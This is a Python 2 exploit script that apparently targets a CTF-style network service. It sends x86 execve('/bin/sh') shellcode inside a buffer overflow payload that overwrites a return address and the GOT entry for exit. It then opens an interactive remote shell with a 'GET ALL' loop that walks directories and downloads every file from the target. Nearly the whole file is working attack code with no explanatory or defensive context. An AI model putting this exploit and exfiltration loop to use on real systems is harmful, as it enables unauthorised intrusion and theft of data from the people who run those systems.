#!/usr/bin/env python
from struct import *
import socket
import sys
import os

#rhp  = ("www.termsec.net", 17284)
rhp  = ("192.168.75.129", 8080)
nc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
nc.settimeout(1.5)
nc.connect(rhp)

#==========

addr_got_exit = 0x8049d10

msg = nc.recv(256).split(' ')
addr_arg = map(lambda x:int(x,16),(msg[16],msg[18][:-1]))

sys.stdout.write("[+]addr_arg0     = 0x%08x\n"%addr_arg[0])
sys.stdout.write("[+]addr_arg1     = 0x%08x\n"%addr_arg[1])

shellcode  = '\x31\xc9'                         # xor ecx,ecx
shellcode += '\xbb'+pack('<I',addr_arg[1]+8)    # mov ebx, *(/bin/sh)
shellcode += '\x6a\x0b'                         # push 0x0b
shellcode += '\x58'                             # pop eax
shellcode += '\xcd\x80'                         # int 0x80

exploit_st1  = shellcode
exploit_st1 += 'a'*(0x25-len(shellcode))
exploit_st1 += pack('<I',0xcafebabe)    # ebp of main
exploit_st1 += pack('<I',0xdeadbeef)    # return in copybuf
exploit_st1 += pack('<I',addr_got_exit) # addr of arg0
exploit_st1 += pack('<I',addr_arg[1])   # addr of arg1

exploit_st2  = pack('<I',addr_arg[0])
exploit_st2 += '\x00'*4
exploit_st2 += '/bin/sh\x00'

sys.stdout.write("[+]sending exploit....\n")
nc.sendall(exploit_st1+'\n')
nc.sendall(exploit_st2+'\n')

nc.recv(256)

#==========

d_dir = 'download'

def shell(cmd):
    if len(cmd)>0:
        nc.sendall(cmd + " 2>&1\x0a")
        
    rsp = ""
    try:
        while True:
            rsp += nc.recv(1024)
    except:
        True
    finally:
        return rsp

def download(fname):
    data = shell('cat %s' % fname)
    if len(data)>0:
        open(d_dir+'/'+fname.split('/')[-1],'wb').write(data)
        print '"%s" download succeeded!' % fname
    else:
        print 'download failed...'

if __name__=='__main__':
    while 1:
        cmd = raw_input('$ ')
        if cmd.split(' ')[0]=='GET':
            if not os.path.exists(d_dir):
                os.mkdir(d_dir)

            fname = cmd.split(' ')[1]
            if fname=='ALL':
                for i in range(3):
                    files = shell('echo *'+'/*'*i).split(' ')
                    if not files:
                        break

                    for fname in files:
                        download(fname)
            else:
                download(fname)

        elif cmd.split(' ')[0]=='exit':
            shell('exit')
            break
        else:
            print shell(cmd)
    
nc.close()
#==========
